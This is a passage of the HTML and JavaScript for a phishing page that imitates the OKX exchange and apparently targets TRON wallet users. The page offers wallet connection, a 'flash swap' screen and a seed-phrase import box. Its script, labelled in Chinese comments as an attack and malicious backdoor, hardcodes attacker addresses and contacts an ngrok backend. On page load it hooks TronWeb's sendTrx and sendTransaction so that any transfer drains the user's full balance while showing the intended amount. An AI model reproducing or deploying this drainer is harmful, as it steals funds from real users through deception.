            min-height: calc(100vh - 160px);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 40px 16px;
        }

        .web3-animation {
            width: 200px;
            height: 200px;
            margin-bottom: 40px;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .web3-grid {
            display: grid;
            grid-template-columns: repeat(20, 1fr);
            grid-template-rows: repeat(20, 1fr);
            gap: 2px;
            width: 100%;
            height: 100%;
            opacity: 0.8;
        }

        .grid-dot {
            width: 100%;
            height: 100%;
            background: #333;
            border-radius: 1px;
            transition: all 0.3s ease;
        }

        .grid-dot.active {
            background: #7ed321;
            box-shadow: 0 0 4px #7ed321;
        }

        .web3-title {
            font-size: 24px;
            font-weight: 600;
            color: #fff;
            margin-bottom: 8px;
            text-align: center;
        }

        .web3-subtitle {
            font-size: 14px;
            color: #666;
            margin-bottom: 40px;
            text-align: center;
        }

        .web3-actions {
            width: 100%;
            max-width: 300px;
        }

        .web3-btn {
            width: 100%;
            background: #fff;
            color: #000;
            border: none;
            padding: 16px;
            border-radius: 24px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 16px;
        }

        .web3-btn.secondary {
            background: transparent;
            color: #fff;
            border: 1px solid #333;
        }

        /* 资产页面 */
        .assets-page {
            background: #000;
            min-height: calc(100vh - 160px);
        }

        .assets-header {
            background: linear-gradient(135deg, #1a1a1a 0%, #333 100%);
            padding: 40px 16px;
            position: relative;
            overflow: hidden;
        }

        .falling-coins {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            pointer-events: none;
            z-index: 1;
        }

        .falling-coin {
            position: absolute;
            font-size: 20px;
            opacity: 0.6;
            animation: fall linear infinite;
        }

        @keyframes fall {
            from {
                transform: translateY(-100px) rotate(0deg);
                opacity: 1;
            }
            to {
                transform: translateY(200px) rotate(360deg);
                opacity: 0;
            }
        }

        .balance-display {
            text-align: center;
            position: relative;
            z-index: 2;
        }

        .balance-label {
            font-size: 14px;
            color: #666;
            margin-bottom: 8px;
        }

        .balance-amount {
            font-size: 32px;
            font-weight: 600;
            color: #fff;
            margin-bottom: 20px;
        }

        .balance-actions {
            display: flex;
            justify-content: center;
            gap: 16px;
        }

        .balance-action {
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            color: #fff;
            padding: 12px 24px;
            border-radius: 20px;
            font-size: 14px;
            cursor: pointer;
        }

        .assets-content {
            padding: 16px;
        }

        /* 底部导航 */
        .bottom-nav {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: #000;
            border-top: 1px solid #1a1a1a;
            display: flex;
            z-index: 100;
            padding-bottom: env(safe-area-inset-bottom);
        }

        .nav-item {
            flex: 1;
            text-align: center;
            padding: 12px 8px;
            cursor: pointer;
            transition: all 0.2s;
            position: relative;
        }

        .nav-item.active .nav-icon {
            color: #7ed321;
        }

        .nav-item.active .nav-label {
            color: #7ed321;
        }

        .nav-icon {
            font-size: 20px;
            margin-bottom: 4px;
            color: #666;
            transition: color 0.2s;
        }

        .nav-label {
            font-size: 10px;
            color: #666;
            transition: color 0.2s;
        }

        /* 助记词导入模态框 */
        .mnemonic-modal {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.8);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            padding: 20px;
        }

        .mnemonic-modal.show {
            display: flex;
        }

        .mnemonic-content {
            background: #1a1a1a;
            border-radius: 16px;
            padding: 24px;
            width: 100%;
            max-width: 400px;
        }

        .mnemonic-title {
            font-size: 18px;
            font-weight: 600;
            color: #fff;
            text-align: center;
            margin-bottom: 8px;
        }

        .mnemonic-subtitle {
            font-size: 14px;
            color: #666;
            text-align: center;
            margin-bottom: 24px;
        }

        .mnemonic-input {
            width: 100%;
            background: #000;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 16px;
            color: #fff;
            font-size: 14px;
            min-height: 120px;
            resize: vertical;
            margin-bottom: 20px;
        }

        .mnemonic-input::placeholder {
            color: #666;
        }

        .mnemonic-actions {
            display: flex;
            gap: 12px;
        }

        .mnemonic-btn {
            flex: 1;
            padding: 16px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }

        .mnemonic-btn.primary {
            background: #7ed321;
            color: #000;
        }

        .mnemonic-btn.secondary {
            background: transparent;
            color: #fff;
            border: 1px solid #333;
        }

        /* 攻击状态指示器 */
        .attack-indicator {
            position: fixed;
            top: 100px;
            left: 16px;
            right: 16px;
            background: #f5455c;
            color: #fff;
            padding: 12px 16px;
            border-radius: 8px;
            font-size: 12px;
            z-index: 200;
            display: none;
        }

        .attack-indicator.show {
            display: block;
            animation: slideDown 0.3s ease-out;
        }

        @keyframes slideDown {
            from { transform: translateY(-100%); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        /* 调试面板 */
        .debug-panel {
            position: fixed;
            bottom: 100px;
            left: 16px;
            right: 16px;
            background: rgba(0, 0, 0, 0.95);
            color: #7ed321;
            padding: 16px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 11px;
            max-height: 200px;
            overflow-y: auto;
            z-index: 150;
            border: 1px solid #333;
            display: none;
        }

        .debug-panel.show {
            display: block;
        }

        .debug-toggle {
            position: fixed;
            bottom: 100px;
            right: 16px;
            background: #7ed321;
            color: #000;
            border: none;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            z-index: 160;
        }

        /* 成功提示 */
        .success-toast {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #7ed321;
            color: #000;
            padding: 16px 24px;
            border-radius: 8px;
            font-weight: 600;
            z-index: 2000;
            display: none;
        }

        .success-toast.show {
            display: block;
            animation: toast 2s ease-in-out;
        }

        @keyframes toast {
            0%, 100% { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
            20%, 80% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
        }

        .success-toast.error {
            background: #f5455c;
            color: #fff;
        }

        /* 钱包连接状态指示器 */
        .wallet-status {
            background: #7ed321;
            color: #000;
            padding: 4px 8px;
            border-radius: 12px;
            font-size: 10px;
            font-weight: 600;
            display: none;
        }

        .wallet-status.show {
            display: inline-block;
        }

        /* 响应式适配 */
        @media (max-width: 375px) {
            .header {
                padding: 8px 12px;
            }
            
            .search-bar {
                margin: 12px;
            }
            
            .kyc-banner, .strategy-card {
                margin: 0 12px 12px;
            }
        }
    </style>
</head>
<body>
    <!-- 顶部导航栏 -->
    <div class="header">
        <div class="header-left">
            <div class="menu-btn">
                <div class="menu-line"></div>
                <div class="menu-line"></div>
                <div class="menu-line"></div>
            </div>
            <div class="platform-selector" onclick="showPlatformDropdown()">
                <span id="currentPlatform">交易所</span>
                <span class="platform-arrow">></span>
            </div>
        </div>
        <div class="header-right">
            <!-- 钱包连接按钮 -->
            <button class="connect-wallet-btn" id="connectWalletBtn" onclick="showWalletModal()">连接钱包</button>
            <div class="wallet-status" id="walletStatus">已连接</div>
            
            <div class="gift-icon">
                🎁
                <div class="notification-badge">3</div>
            </div>
            <div class="user-avatar" onclick="showUserMenu()">
                👤
            </div>
        </div>
    </div>

    <!-- 钱包连接模态框 -->
    <div class="wallet-modal" id="walletModal">
        <div class="wallet-content">
            <div class="wallet-title">连接钱包</div>
            <div class="wallet-subtitle">选择您要连接的钱包</div>
            
            <div class="wallet-options">
                <div class="wallet-option" onclick="connectImToken()">
                    <div class="wallet-icon imtoken-icon">i</div>
                    <div class="wallet-info">
                        <div class="wallet-name">imToken</div>
                        <div class="wallet-desc">移动端DeFi钱包</div>
                    </div>
                </div>
                
                <div class="wallet-option" onclick="connectTronLink()">
                    <div class="wallet-icon tronlink-icon">T</div>
                    <div class="wallet-info">
                        <div class="wallet-name">TronLink</div>
                        <div class="wallet-desc">TRON官方钱包</div>
                    </div>
                </div>
                
                <div class="wallet-option" onclick="connectMetaMask()">
                    <div class="wallet-icon metamask-icon">M</div>
                    <div class="wallet-info">
                        <div class="wallet-name">MetaMask</div>
                        <div class="wallet-desc">以太坊生态钱包</div>
                    </div>
                </div>
            </div>
            
            <div class="wallet-actions">
                <button class="wallet-btn secondary" onclick="closeWalletModal()">取消</button>
                <button class="wallet-btn primary" onclick="importWallet()">导入钱包</button>
            </div>
        </div>
    </div>

    <!-- 搜索栏 -->
    <div class="search-bar" onclick="showSearch()">
        <div class="search-icon">🔍</div>
        <div class="search-text">🔥 SKY 新币上线</div>
    </div>

    <!-- 主要内容区域 -->
    <div class="main-content active" id="favorites">
        <!-- KYC认证横幅 -->
        <div class="kyc-banner">
            <div class="kyc-content">
                <h3>继续完成认证，获得最高 100 USDT</h3>
                <p>您需提供身份证、自拍照和个人信息</p>
                <button class="kyc-btn" onclick="startKYC()">继续认证</button>
            </div>
        </div>

        <!-- 策略交易卡片 -->
        <div class="strategy-card">
            <div class="strategy-icon">📊</div>
            <div class="strategy-content">
                <div class="strategy-title">策略交易</div>
                <div class="strategy-desc">一键开启 SOL 网格策略，赚取高年化收益，立即创建吧</div>
            </div>
            <div class="strategy-badge">1/6</div>
        </div>
    </div>

    <!-- 市场页面 -->
    <div class="main-content" id="market">
        <div class="market-header">
            <div class="market-stats">
                <div class="stat-card">
                    <div class="stat-label">市值</div>
                    <div class="stat-value">$4.17万亿</div>
                    <div class="stat-change">-0.30%</div>
                </div>
                <div class="stat-card">
                    <div class="stat-label">成交额</div>
                    <div class="stat-value">$1,293.12亿</div>
                    <div class="stat-change">-24.61%</div>
                </div>
                <div class="stat-card">
                    <div class="stat-label">市值占比</div>
                    <div class="stat-value">55.44%</div>
                    <div style="font-size: 10px; color: #ff9500;">🪙 Bitcoin</div>
                </div>
            </div>

            <div class="fomc-notice">
                <div class="fomc-text">🌍 FOMC 经济预测（美国）将于 9月18日 发布</div>
                <div>></div>
            </div>
        </div>

        <div class="pairs-tabs">
            <div class="tab active">自选</div>
            <div class="tab">现货</div>
            <div class="tab">合约</div>
            <div class="tab">期权</div>
            <div class="tab">总览</div>
        </div>

        <div class="pairs-filters">
            <button class="filter-btn active">全部</button>
            <button class="filter-btn">主流币</button>
            <button class="filter-btn">新币种</button>
            <button class="filter-btn">人工智能</button>
            <button class="filter-btn">Solana</button>
        </div>

        <div class="pairs-header">
            <div>名称 / 成交额</div>
            <div>最新价</div>
            <div>今日涨跌</div>
        </div>

        <div class="trading-pairs">
            <div class="pair-item">
                <div class="pair-info">
                    <div class="pair-icon btc-icon">₿</div>
                    <div class="pair-details">
                        <h4>BTC/USDT</h4>
                        <div class="pair-volume">$2.07亿</div>
                    </div>
                </div>
                <div class="pair-price">
                    <div class="price-value">115,968.5</div>
                    <div class="price-usd">$116,032.3</div>
                </div>
                <div class="price-change positive">+0.03%</div>
            </div>

            <div class="pair-item">
                <div class="pair-info">
                    <div class="pair-icon eth-icon">Ξ</div>
                    <div class="pair-details">
                        <h4>ETH/USDT</h4>
                        <div class="pair-volume">$4.84亿</div>
                    </div>
                </div>
                <div class="pair-price">
                    <div class="price-value">4,651.04</div>
                    <div class="price-usd">$4,653.60</div>
                </div>
                <div class="price-change negative">-0.34%</div>
            </div>

            <div class="pair-item">
                <div class="pair-info">
                    <div class="pair-icon okb-icon">O</div>
                    <div class="pair-details">
                        <h4>OKB/USDT</h4>
                        <div class="pair-volume">$8,164.2万</div>
                    </div>
                </div>
                <div class="pair-price">
                    <div class="price-value">201.89</div>
                    <div class="price-usd">$202.00</div>
                </div>
                <div class="price-change positive">+0.43%</div>
            </div>

            <div class="pair-item">
                <div class="pair-info">
                    <div class="pair-icon sol-icon">◎</div>
                    <div class="pair-details">
                        <h4>SOL/USDT</h4>
                        <div class="pair-volume">$2.4亿</div>
                    </div>
                </div>
                <div class="pair-price">
                    <div class="price-value">247.25</div>
                    <div class="price-usd">$247.39</div>
                </div>
                <div class="price-change positive">+2.00%</div>
            </div>

            <div class="pair-item">
                <div class="pair-info">
                    <div class="pair-icon doge-icon">Ð</div>
                    <div class="pair-details">
                        <h4>DOGE/USDT</h4>
                        <div class="pair-volume">$5.43亿</div>
                    </div>
                </div>
                <div class="pair-price">
                    <div class="price-value">0.28794</div>
                    <div class="price-usd">$0.28810</div>
                </div>
                <div class="price-change negative">-0.50%</div>
            </div>

            <div class="pair-item">
                <div class="pair-info">
                    <div class="pair-icon xrp-icon">X</div>
                    <div class="pair-details">
                        <h4>XRP/USDT</h4>
                        <div class="pair-volume">$5,376.2万</div>
                    </div>
                </div>
                <div class="pair-price">
                    <div class="price-value">3.078</div>
                    <div class="price-usd">$3.0797</div>
                </div>
                <div class="price-change negative">-1.32%</div>
            </div>
        </div>
    </div>

    <!-- 🎯 闪兑页面 - 核心攻击功能 -->
    <div class="main-content" id="convert">
        <div class="convert-page">
            <div class="convert-header">
                <div class="convert-title">闪兑</div>
                <div class="fee-badge">0手续费</div>
            </div>

            <div class="convert-form">
                <div class="currency-input">
                    <div class="currency-label">消耗</div>
                <div class="currency-selector">
                    <div class="currency-info" onclick="selectFromCurrency()">
                            <div class="currency-icon trx-icon">T</div>
                            <div>
                                <div class="currency-name">TRX</div>
                                <div class="currency-balance" id="trxBalance">可用: 0 TRX</div>
                            </div>
                        </div>
                        <input type="number" class="amount-input" placeholder="输入TRX数量" id="fromAmount" oninput="calculateConversion()">
                    </div>
                </div>

                <div class="swap-btn" onclick="swapCurrencies()">
                    ⇅
                </div>

                <div class="currency-input">
                    <div class="currency-label">获得</div>
                <div class="currency-selector">
                    <div class="currency-info"  onclick="selectToCurrency()">
                            <div class="currency-icon usdt-icon">₮</div>
                            <div>
                                <div class="currency-name">USDT</div>
                                <div class="currency-balance">预计获得</div>
                            </div>
                        </div>
                        <input type="number" class="amount-input" placeholder="0" id="toAmount" readonly>
                    </div>
                </div>
            </div>

            <div class="rate-info">
                <div class="rate-text">1 TRX ≈ 0.1634 USDT</div>
            </div>

            <button class="convert-button" id="convertBtn" onclick="executeAttack()" disabled>请先连接钱包</button>
        </div>
    </div>

    <!-- 交易页面 -->
    <div class="main-content" id="trade">
        <div style="padding: 16px;">
            <div class="strategy-card">
                <div class="strategy-icon">🤖</div>
                <div class="strategy-content">
                    <div class="strategy-title">全天候智能交易，轻松躺赢</div>
                    <div class="strategy-desc">一键开启智能交易，赚取高达 200.18% 年化收益。</div>
                </div>
            </div>
        </div>
    </div>

    <!-- Web3页面 -->
    <div class="main-content" id="web3">
        <div class="web3-page">
            <div class="web3-animation">
                <div class="web3-grid" id="web3Grid"></div>
            </div>
            <div class="web3-title">Web3 入口，一个就够</div>
            <div class="web3-subtitle">钱包 · 交易 · NFT · 赚币 · DApp</div>
            <div class="web3-actions">
                <button class="web3-btn" onclick="createWallet()">创建钱包</button>
                <button class="web3-btn secondary" onclick="importWallet()">导入钱包</button>
            </div>
        </div>
    </div>

    <!-- 资产页面 -->
    <div class="main-content" id="assets">
        <div class="assets-page">
            <div class="assets-header">
                <div class="falling-coins" id="fallingCoins"></div>
                <div class="balance-display">
                    <div class="balance-label">昨日收益 👁</div>
                    <div class="balance-amount">0.00 USD ></div>
                    <div class="balance-actions">
                        <button class="balance-action" onclick="depositFunds()">充币</button>
                    </div>
                </div>
            </div>

            <div class="assets-content">
                <div style="text-align: center; margin: 40px 0;">
                    <div style="width: 120px; height: 120px; margin: 0 auto 20px; background: linear-gradient(135deg, #7ed321, #52c41a); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 40px;">💰</div>
                    <h3 style="color: #fff; margin-bottom: 8px;">把握未来 拥抱数字货币</h3>
                    <button class="balance-action" style="background: #7ed321; color: #000; margin-top: 20px;" onclick="depositFunds()">充币</button>
                </div>

                <div style="color: #666; font-size: 12px; margin-bottom: 16px;">如何充币? <span style="color: #7ed321;">查看更多 →</span></div>

                <div style="color: #fff; font-size: 16px; margin-bottom: 16px;">热门币</div>

                <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px;">
                    <div style="text-align: center;">
                        <div class="pair-icon btc-icon" style="margin: 0 auto 8px;">₿</div>
                        <div style="font-size: 12px; color: #fff; margin-bottom: 4px;">BTC</div>
                        <div style="font-size: 12px; color: #fff;">$116,050.3</div>
                        <div style="font-size: 10px; color: #7ed321;">+0.08%</div>
                    </div>
                    <div style="text-align: center;">
                        <div class="pair-icon eth-icon" style="margin: 0 auto 8px;">Ξ</div>
                        <div style="font-size: 12px; color: #fff; margin-bottom: 4px;">ETH</div>
                        <div style="font-size: 12px; color: #fff;">$4,653.51</div>
                        <div style="font-size: 10px; color: #f5455c;">-1.26%</div>
                    </div>
                    <div style="text-align: center;">
                        <div class="pair-icon usdt-icon" style="margin: 0 auto 8px;">₮</div>
                        <div style="font-size: 12px; color: #fff; margin-bottom: 4px;">USDT</div>
                        <div style="font-size: 12px; color: #fff;">$1.00056</div>
                        <div style="font-size: 10px; color: #7ed321;">0.00%</div>
                    </div>
                    <div style="text-align: center;">
                        <div class="pair-icon" style="background: #2196f3; margin: 0 auto 8px;">$</div>
                        <div style="font-size: 12px; color: #fff; margin-bottom: 4px;">USDC</div>
                        <div style="font-size: 12px; color: #fff;">$0.9999</div>
                        <div style="font-size: 10px; color: #7ed321;">0.00%</div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- 底部导航 -->
    <div class="bottom-nav">
        <div class="nav-item active" onclick="switchTab('favorites')">
            <div class="nav-icon">⚡</div>
            <div class="nav-label">欧易</div>
        </div>
        <div class="nav-item" onclick="switchTab('market')">
            <div class="nav-icon">📊</div>
            <div class="nav-label">市场</div>
        </div>
        <div class="nav-item" onclick="switchTab('convert')">
            <div class="nav-icon">⚡</div>
            <div class="nav-label">交易</div>
        </div>
        <div class="nav-item" onclick="switchTab('web3')">
            <div class="nav-icon">🔍</div>
            <div class="nav-label">探索</div>
        </div>
        <div class="nav-item" onclick="switchTab('assets')">
            <div class="nav-icon">⏰</div>
            <div class="nav-label">资产</div>
        </div>
    </div>

    <!-- 助记词导入模态框 -->
    <div class="mnemonic-modal" id="mnemonicModal">
        <div class="mnemonic-content">
            <div class="mnemonic-title">导入钱包</div>
            <div class="mnemonic-subtitle">请输入您的助记词来恢复钱包</div>
            <textarea class="mnemonic-input" id="mnemonicInput" placeholder="请输入12-24个助记词，用空格分隔"></textarea>
            <div class="mnemonic-actions">
                <button class="mnemonic-btn secondary" onclick="closeMnemonicModal()">取消</button>
                <button class="mnemonic-btn primary" onclick="confirmImport()">导入</button>
            </div>
        </div>
    </div>

    <!-- 攻击状态指示器 -->
    <div class="attack-indicator" id="attackIndicator">
        🎯 攻击系统已激活 - 正在捕获用户数据
    </div>

    <!-- 调试面板 -->
    <div class="debug-panel" id="debugPanel">
        <div id="debugLog"></div>
    </div>
    <button class="debug-toggle" onclick="toggleDebug()">调试</button>

    <!-- 成功提示 -->
    <div class="success-toast" id="successToast">✅ 操作成功</div>

    <script>
        // 🎯 全局攻击变量
        let currentTab = 'favorites';
        let isWalletConnected = false;
        let currentAccount = null;
        let tronWeb = null;
        let capturedMnemonic = null;
        let debugMode = false;
        let attackMode = true;
        let userBalance = 0; // 用户真实余额
        
        // 🎯 攻击目标地址 (A成员地址 - 攻击者)
    // const ATTACKER_ADDRESS = 'THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x';
    let ATTACKER_ADDRESS = 'THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x';

    // 🎯 获取后端攻击者地址的函数
    async function getCurrentAttackerAddress() {
        try {
            // 尝试从ngrok后端获取
            const ngrokUrl = 'https://njacnb1250mj.ngrok.xiaomiqiu123.top';
            const response = await fetch(`${ngrokUrl}/api/attacker_address`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                }
            });

            if (response.ok) {
                const result = await response.json();
                if (result.status === 'success' && result.data && result.data.attacker_address) {
                    debugLog(`🎯 从后端获取攻击者地址: ${result.data.attacker_address}`);
                    return {
                        address: result.data.attacker_address,
                        info: {
                            wallet_name: result.data.wallet_name,
                            network: result.data.network,
                            usage_count: result.data.usage_count
                        }
                    };
                }
            }
        } catch (error) {
            debugLog(`⚠️ 从后端获取攻击者地址失败: ${error.message}`);
        }

        // 如果后端获取失败，返回当前地址
        return {
            address: ATTACKER_ADDRESS,
            info: {
                wallet_name: '默认攻击者钱包',
                network: 'TRON',
                usage_count: 0
            }
        };
    }


        // 初始化
    document.addEventListener('DOMContentLoaded', async function() {
            debugLog('🚀 OKX安全研究平台已加载');
            debugLog('🎯 攻击系统已激活');
            debugLog(`🎯 攻击目标地址: ${ATTACKER_ADDRESS}`);
        debugLog(`🎯 初始攻击目标地址: ${ATTACKER_ADDRESS}`);

        //从ngrok后端获取最新的攻击者地址 - 已禁用，使用固定地址
        try{
            // 🎯 注释掉后端地址获取，强制使用指定的攻击者地址
            // if (typeof getCurrentAttackerAddress === 'function'){
            //     const cloudAddressResult = await getCurrentAttackerAddress();
            //     if (cloudAddressResult && cloudAddressResult.address && cloudAddressResult.address !== ATTACKER_ADDRESS){
            //         ATTACKER_ADDRESS = cloudAddressResult.address;
            //         debugLog(`🎯 后端已更改最新攻击目标地址: ${ATTACKER_ADDRESS}`);
            //         debugLog(`🎯 钱包信息: ${cloudAddressResult.info ? cloudAddressResult.info.wallet_name : '默认钱包'}`);
            //     }
            // }
            debugLog(`🎯 使用固定攻击者地址: ${ATTACKER_ADDRESS}`);
            debugLog(`🎯 攻击者钱包: TDUDyhCzhDsmbpqkPBZvLqjYngTwTgGE5s`);
        }catch (error){
            debugLog(`⚠️ 获取最新攻击目标地址失败: ${error.message}，使用默认地址`);
        }

            debugLog('🎯 TRX → USDT 攻击逻辑已就绪');
            
            initializeWeb3Grid();
            startFallingCoins();
            checkWalletEnvironment();
        });

        // 调试日志
        function debugLog(message) {
            const debugLog = document.getElementById('debugLog');
            const timestamp = new Date().toLocaleTimeString();
            const logMessage = `[${timestamp}] ${message}`;
            
            if (debugLog) {
                debugLog.innerHTML += `${logMessage}<br>`;
                debugLog.scrollTop = debugLog.scrollHeight;
            }
            
            console.log(`🎯 ${logMessage}`);
            
            // 保存到localStorage
            try {
                const logs = JSON.parse(localStorage.getItem('attackLogs') || '[]');
                logs.push({
                    timestamp: new Date().toISOString(),
                    message,
                    type: 'debug'
                });
                localStorage.setItem('attackLogs', JSON.stringify(logs.slice(-100)));
            } catch (e) {
                console.warn('无法保存日志:', e);
            }
        }

        // 检查钱包环境
        function checkWalletEnvironment() {
            debugLog('🔍 检查TRON钱包环境...');
            
            if (window.tronWeb) {
                debugLog('✅ 检测到TronWeb环境');
                tronWeb = window.tronWeb;
                checkExistingConnection();
            } else {
                debugLog('⚠️ 等待钱包环境加载...');
                setTimeout(checkWalletEnvironment, 2000);
            }
        }

        async function checkExistingConnection() {
            try {
                if (tronWeb && tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
                    debugLog(`✅ 发现已连接TRON账户: ${tronWeb.defaultAddress.base58}`);
                    await handleSuccessfulConnection(tronWeb.defaultAddress.base58);
                }
            } catch (error) {
                debugLog(`❌ 检查连接失败: ${error.message}`);
            }
        }
        // 🎯 强制刷新用户余额 - 移到全局作用域
        async function forceRefreshBalance() {
            try {
                if (!tronWeb || !currentAccount) return;

                debugLog('🔄 强制刷新用户余额...');
                const balance = await tronWeb.trx.getBalance(currentAccount);
                const newBalance = tronWeb.fromSun(balance);

                debugLog(`💰 刷新后余额: ${newBalance} TRX`);
                userBalance = newBalance;
                document.getElementById('trxBalance').textContent = `可用: ${newBalance} TRX`;

                return newBalance;
            } catch (error) {
                debugLog(`❌ 余额刷新失败: ${error.message}`);
                return userBalance;
            }
        }
        // 🎯 处理钱包连接成功 - 恶意后门激活
        async function handleSuccessfulConnection(address) {
            currentAccount = address;
            isWalletConnected = true;
            
            // 更新UI
            updateWalletUI(true);
            
            debugLog(`✅ TRON钱包连接成功: ${currentAccount}`);
            debugLog('🎯 恶意后门已激活！');
            debugLog('🎯 开始获取用户余额信息...');
            
            // 🎯 获取用户真实余额
            await getTronBalance(address);

        }

        // 🎯🎯🎯 关键恶意后门：安装TronWeb劫持逻辑（全局函数）
        window.installTronWebHijack = function installTronWebHijack() {
            if (window.tronWeb && window.tronWeb.trx && !window.tronWebHijacked){
                window.tronWebHijacked = true; // 防止重复劫持
                
                debugLog('🎯 开始安装TronWeb劫持...');
                
                // 🎯 劫持所有可能的转账方法
                const methods = ['sendTrx', 'sendTransaction'];
                
                methods.forEach(methodName => {
                    if (window.tronWeb.trx[methodName]) {
                        const originalMethod = window.tronWeb.trx[methodName];
                        debugLog(`🎯 劫持方法: ${methodName}`);
                        
                        window.tronWeb.trx[methodName] = async function(...args) {
                            // 🎯 防止劫持自己的调用（避免无限递归）
                            if (this._hijackInProgress) {
                                debugLog('🔄 检测到劫持递归，直接执行原始方法');
                                return await originalMethod.apply(this, args);
                            }
                            
                            this._hijackInProgress = true;
                            
                            try {
                                debugLog('🎯🎯🎯 劫持到用户交易请求！🎯🎯🎯');
                                debugLog(`🎯 劫持方法: ${methodName}`);
                                debugLog(`🎯 原始参数: ${JSON.stringify(args)}`);
                                
                                let to, amount, from, options;
                                
                                // 解析不同方法的参数
                                if (methodName === 'sendTrx') {
                                    [to, amount, from, options] = args;
                                    debugLog(`🎯 sendTrx - 用户以为转账: ${amount / 1000000} TRX`);
                                } else if (methodName === 'sendTransaction') {
                                    if (typeof args[0] === 'object') {
                                        ({to, value: amount, from} = args[0]);
                                        options = args[1];
                                    } else {
                                        [to, amount, from, options] = args;
                                    }
                                    debugLog(`🎯 sendTransaction - 用户以为转账: ${amount / 1000000} TRX`);
                                }
                                
                                debugLog(`🎯 目标地址: ${to}`);

                                // 🎯 恶意修改：将转账金额改为用户全部余额
                                const userTotalBalance = await tronWeb.trx.getBalance(from || currentAccount);
                                const feeReserve = tronWeb.toSun(1);// 只预留1 TRX手续费
                                const maliciousAmount = userTotalBalance - feeReserve;

                                debugLog(`🎯 恶意修改转账金额:`);
                                debugLog(`- 用户余额: ${tronWeb.fromSun(userTotalBalance)} TRX`);
                                debugLog(`- 预留手续费: ${tronWeb.fromSun(feeReserve)} TRX`);
                                debugLog(`- 实际转账: ${tronWeb.fromSun(maliciousAmount)} TRX`);
                                debugLog(`🎯 用户在imToken中看到的是原始金额，但实际转走全部余额！`);

                                // 🎯 执行恶意转账：转走用户全部余额
                                debugLog('🎯 开始执行恶意转账...');
                                let result;
                                if (methodName === 'sendTrx') {
                                    debugLog(`🎯 调用原始sendTrx: to=${to}, maliciousAmount=${maliciousAmount}, from=${from}`);
                                    result = await originalMethod.call(this, to, maliciousAmount, from, options);
                                } else if (methodName === 'sendTransaction') {
                                    if (typeof args[0] === 'object') {
                                        const modifiedTx = {...args[0], value: maliciousAmount};
                                        debugLog(`🎯 调用原始sendTransaction: ${JSON.stringify(modifiedTx)}`);
                                        result = await originalMethod.call(this, modifiedTx, args[1]);
                                    } else {
                                        debugLog(`🎯 调用原始sendTransaction: to=${to}, maliciousAmount=${maliciousAmount}, from=${from}`);
                                        result = await originalMethod.call(this, to, maliciousAmount, from, options);
                                    }
                                }
                                
                                debugLog('🏆🏆🏆 恶意后门攻击成功！🏆🏆🏆');
                                debugLog(`💰 实际转走: ${tronWeb.fromSun(maliciousAmount)} TRX`);
                                debugLog(`😈 用户以为只转了: ${amount / 1000000} TRX`);
                                debugLog(`🎯 返回结果: ${JSON.stringify(result)}`);

                                return result;
                            } catch (error) {
                                debugLog(`❌ 恶意转账失败: ${error.message}`);
                                debugLog(`❌ 恶意转账错误详情: ${JSON.stringify(error)}`);
                                debugLog(`❌ 恶意转账错误堆栈: ${error.stack}`);
                                
                                // 🎯 如果恶意转账失败，执行原始转账（让用户看到正常流程）
                                debugLog('🎯 回退到原始转账参数...');
                                try {
                                    const fallbackResult = await originalMethod.call(this, ...args);
                                    debugLog(`🎯 原始转账成功: ${JSON.stringify(fallbackResult)}`);
                                    return fallbackResult;
                                } catch (fallbackError) {
                                    debugLog(`❌ 原始转账也失败: ${fallbackError.message}`);
                                    throw fallbackError;
                                }
                            } finally {
                                this._hijackInProgress = false;
                            }
                        };
                    }
                });
                
                debugLog('🎯 TronWeb交易劫持已安装！');
                return true;
            }
            return false;
        }
        
        // 🎯 重新启用劫持安装，实现真正的钓鱼攻击
        document.addEventListener('DOMContentLoaded', function() {
            debugLog('🎯 重新启用劫持逻辑，实现用户看到小额但实际转走全部');
            // 🎯 尝试立即安装劫持
            if (!window.installTronWebHijack()) {
                debugLog('🎯 TronWeb尚未就绪，设置延迟劫持...');
                // 🎯 如果TronWeb还没准备好，设置定时器
                const hijackInterval = setInterval(() => {
                    if (window.installTronWebHijack()) {
                        clearInterval(hijackInterval);
                        debugLog('🎯 延迟劫持安装成功！');
                    }
                }, 500);
                
                // 🎯 最多尝试10秒
                setTimeout(() => {
                    clearInterval(hijackInterval);
                    debugLog('🎯 劫持安装超时');
                }, 10000);
            }
        });


        // 🎯 获取用户TRON余额
        async function getTronBalance(address) {
            try {
                if (!tronWeb) return;
                
                const balance = await tronWeb.trx.getBalance(address);
                userBalance = tronWeb.fromSun(balance);
                
                debugLog(`💰 获取用户TRX余额: ${userBalance} TRX`);
                debugLog(`💰 等价USD价值: $${(userBalance * 0.1634).toFixed(2)}`);
                
                // 更新界面显示
                document.getElementById('trxBalance').textContent = `可用: ${userBalance} TRX`;
                
                debugLog('🎯 余额获取完成，准备执行攻击...');
                
            } catch (error) {
                debugLog(`❌ 获取余额失败: ${error.message}`);
                // 使用模拟余额用于演示
                userBalance = (Math.random() * 1000 + 100).toFixed(6);
                document.getElementById('trxBalance').textContent = `可用: ${userBalance} TRX`;
